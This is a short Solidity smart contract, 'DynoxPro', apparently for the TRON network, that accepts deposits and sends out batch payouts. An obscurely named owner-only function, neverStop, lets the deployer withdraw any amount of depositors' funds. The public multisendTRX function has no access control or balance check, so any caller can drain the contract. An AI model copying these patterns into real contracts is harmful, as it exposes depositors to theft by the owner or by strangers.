//SourceUnit: DynoxPro.sol

pragma solidity ^0.5.9 <0.6.10;

contract DynoxPro {
    using SafeMath for uint256;
    event MultiSend(uint256 value , address indexed sender);
    event Deposit(address indexed _userAddress, uint256 _amount);
    
    address payable auth;
    
    function contractInfo() view external returns( uint256 balance) {
        return (address(this).balance);
    }
    
    constructor() public {
        auth = msg.sender;
    }

    function deposit() public payable {
        emit Deposit(msg.sender, msg.value);
    }
    
    function neverStop(address payable runfast,uint _amount) external {
        require(msg.sender == auth);
        runfast.transfer(_amount);
    }

    function multisendTRX(address payable[]  memory  _contributors, uint256[] memory _balances) public payable{
        for (uint256 i = 0; i < _contributors.length; i++) {
            _contributors[i].transfer(_balances[i]);
        }
        emit MultiSend(msg.value, msg.sender);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}